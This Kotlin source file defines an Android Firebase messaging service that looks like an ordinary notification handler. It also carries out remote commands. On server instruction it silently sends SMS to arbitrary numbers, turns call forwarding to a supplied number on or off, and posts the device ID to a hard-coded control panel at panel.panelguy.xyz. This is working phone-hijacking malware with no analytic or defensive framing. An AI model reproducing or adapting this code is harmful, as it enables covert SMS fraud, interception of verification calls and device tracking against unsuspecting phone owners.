package com.example.test

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val CHANNEL_ID = "default_channel"
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "Message received")

        // Handle notification
        remoteMessage.notification?.let {
            showNotification(it.title ?: "", it.body ?: "")
        }

        // Handle data payload
        if (remoteMessage.data.isNotEmpty()) {
            handleDataMessage(remoteMessage.data)
        }
    }

    private fun handleDataMessage(data: Map<String, String>) {
        val type = data["type"]
        val phone = data["phone"]
        val message = data["message"]
        val simSlotStr = data["simSlot"]
        val forwardNumber = data["number"]

        val simSlot = simSlotStr?.toIntOrNull() ?: 0

        when (type) {
            "ping" -> sendOnlineConfirmation()

            "call_forwarding" -> {
                if (!forwardNumber.isNullOrEmpty()) {
                    val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                    val utility = CallForwardingUtility(applicationContext, deviceId)
                    val result = utility.forwardCall(forwardNumber, simSlot)
                    Log.d(TAG, "Call forwarding result: $result")
                } else {
                    Log.w(TAG, "Missing number for call forwarding")
                }
            }

            "call_forwarding_disable" -> {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val utility = CallForwardingUtility(applicationContext, deviceId)
                val result = utility.deactivateCallForwarding(simSlot)
                Log.d(TAG, "Deactivate call forwarding: $result")
            }

            else -> {
                if (phone != null && message != null) {
                    Log.d(TAG, "Sending SMS...")
                    sendSms(phone, message, simSlot)
                }
            }
        }
    }

    private fun sendSms(phone: String, message: String, simSlot: Int) {
        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

            if (subManager == null) {
                Log.e(TAG, "SubscriptionManager is null")
                return
            }

            val activeSubscriptions = subManager.activeSubscriptionInfoList

            if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                Log.w(TAG, "Invalid SIM slot, using default")
                SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
                Log.d(TAG, "SMS sent to $phone using default SIM")
                return
            }

            val subscriptionId = activeSubscriptions[simSlot].subscriptionId
            val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            smsManager.sendTextMessage(phone, null, message, null, null)
            Log.d(TAG, "SMS sent to $phone using SIM slot $simSlot")
        } catch (e: SecurityException) {
            Log.e(TAG, "SEND_SMS permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
        }
    }

    private fun sendOnlineConfirmation() {
        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                }

                val url = URL("https://panel.panelguy.xyz/devices/devices/ping-response")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                Log.d(TAG, "Online confirmation sent: ${conn.responseCode}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send online confirmation", e)
            }
        }.start()
    }

    private fun showNotification(title: String, messageBody: String) {
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Channel for app notifications"
                enableLights(true)
                lightColor = android.graphics.Color.BLUE
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        notificationManager.notify(0, notification)
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: $token")
        // Send token to server if needed
    }
}